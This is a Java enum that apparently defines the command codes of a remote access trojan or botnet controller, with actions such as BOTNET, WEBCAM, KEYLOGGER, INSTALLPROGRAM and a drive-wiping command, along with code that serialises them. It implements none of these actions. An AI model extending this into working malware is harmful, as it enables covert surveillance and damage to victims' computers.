package me.sebsb.action;

import java.util.ArrayList;

public enum Action {

	DISCORD("a"),
	ALTF4("b"),
	MESSAGE_BOX("c"),
	BOTNET("d"),
	DRIVEFUCKER("e"),
	DESKTOP("f"),
	OPEN_URL("g"),
	INSTALL_CLIENT("h"),
	WEBCAM("i"),
	INSTALLPROGRAM("j"),
	SHUTDOWN("k"),
	KEYLOGGER("l");
	
	private String command;
	private String data;
	
	Action(String command) {
		this.command = command;
	}
	
	public String getCommand() {
		return this.command + (data == null ? "" : getSeparator() + this.data);
	}
	
	@Override
	public String toString() {
		return this.getCommand();
	}
	
	public void setData(ArrayList<String> data) {
		if (data == null || data.isEmpty()) {
			return;
		}
		StringBuilder sb = new StringBuilder();
		for (String str : data) {
			sb.append(str);
			if (!str.equals(data.get(data.size() - 1))) {
				sb.append(getSeparator());
			}
		}
		this.data = sb.toString();
	}
	
	public void setData(String[] data) {
		ArrayList<String> data2 = new ArrayList<String>();
		for (String str : data) {
			data2.add(str);
		}
		this.setData(data2);
	}
	
	public static String getSeparator() {
		return "/../";
	}
}
